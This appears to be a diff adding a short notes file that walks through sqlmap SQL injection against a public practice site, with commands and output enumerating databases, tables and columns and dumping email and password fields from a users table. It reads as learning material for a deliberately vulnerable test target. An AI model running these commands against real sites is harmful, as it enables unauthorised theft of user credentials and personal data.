@@ -1,0 +1,76 @@
+To view a database tables and details :
+
+1. sqlmap
+
+2.To view databases: 
+	sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 --dbs    
+
+Output :
+
+[12:14:08] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+
+3. To view tables :
+	sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables    
+<<<<<< here acuart is the db name.
+
+Output :
+
+12:15:05] [INFO] fetching tables for database: 'acuart'
+Database: acuart
+[8 tables]
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+
+
+4. To view the columns of that particular table :
+	sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --columns   
+<<<<<<<< here users is the table name
+
+Output :
+
+[12:16:12] [INFO] fetching columns for table 'users' in database 'acuart'
+Database: acuart
+Table: users
+[8 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| address | mediumtext   |
+| cart    | varchar(100) |
+| cc      | varchar(100) |
+| email   | varchar(100) |
+| name    | varchar(100) |
+| pass    | varchar(100) |
+| phone   | varchar(100) |
+| uname   | varchar(100) |
++---------+--------------+
+
+
+5. To view column values :
+	sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C email,pass --dump    
+
+Output : 
+
+[12:17:10] [INFO] fetching entries of column(s) 'email,pass' for table 'users' in database 'acuart'
+Database: acuart
+Table: users
+[1 entry]
++-------------------------------------------+------+
+| email                                     | pass |
++-------------------------------------------+------+
+| Hi I am test for crypto and SQL Injection | test |
++-------------------------------------------+------+
+
+
